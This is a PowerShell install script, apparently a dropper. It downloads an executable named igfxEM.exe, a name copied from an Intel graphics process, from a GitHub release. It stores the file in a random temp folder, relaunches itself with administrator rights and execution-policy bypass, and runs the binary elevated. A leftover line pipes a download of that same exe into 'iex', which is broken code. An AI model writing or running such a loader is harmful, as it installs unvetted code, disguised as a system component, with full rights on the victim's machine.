
# install.ps1
$ErrorActionPreference = "Stop"
$ExeUrl  = "https://github.com/Gadgetechno/neww/releases/download/new/igfxEM.exe"
$AppName = "igfxEM.exe"
$Mode    = "create"   # ← "create" or "delete"

$TempDir = Join-Path $env:TEMP "App_$(Get-Random)"
New-Item -ItemType Directory -Path $TempDir | Out-Null
$ExePath = Join-Path $TempDir $AppName

Write-Host "Downloading ($([math]::Round(83,0))MB)..." -ForegroundColor Cyan
$ProgressPreference = 'SilentlyContinue'  # speed badhane ke liye
Invoke-WebRequest -Uri $ExeUrl -OutFile $ExePath -UseBasicParsing

# Self-elevate to Admin
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "Requesting Admin rights (UAC)..." -ForegroundColor Yellow
    $cmd = "-NoProfile -ExecutionPolicy Bypass -Command `"Set-Location '$TempDir'; iex ((New-Object Net.WebClient).DownloadString('$ExeUrl'))`""
    # Actually simpler: re-run same script elevated
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Mode $Mode"
    exit
}

Write-Host "Running as Administrator..." -ForegroundColor Green
Start-Process -FilePath $ExePath -ArgumentList "--mode=$Mode" -WorkingDirectory $TempDir -Wait

# Optional: cleanup after done
# Remove-Item -Recurse -Force $TempDir
Write-Host "Done." -ForegroundColor Green
